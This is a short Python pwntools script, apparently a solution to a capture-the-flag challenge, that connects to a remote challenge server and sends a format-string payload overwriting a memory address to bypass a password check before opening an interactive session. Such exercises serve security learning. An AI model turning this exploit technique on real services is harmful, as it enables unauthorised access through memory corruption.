from pwn import *

conn = remote('node4.buuoj.cn', 25581)
#conn = process('./pwn5')

# name is the 7th position 
conn.recvuntil(b'your name:')

payload = fmtstr_payload(10, {0x0804c044:0x1})
conn.send(payload)

conn.recvuntil(b'your passwd:')
conn.sendline(b'1')
conn.recvline()
conn.interactive()
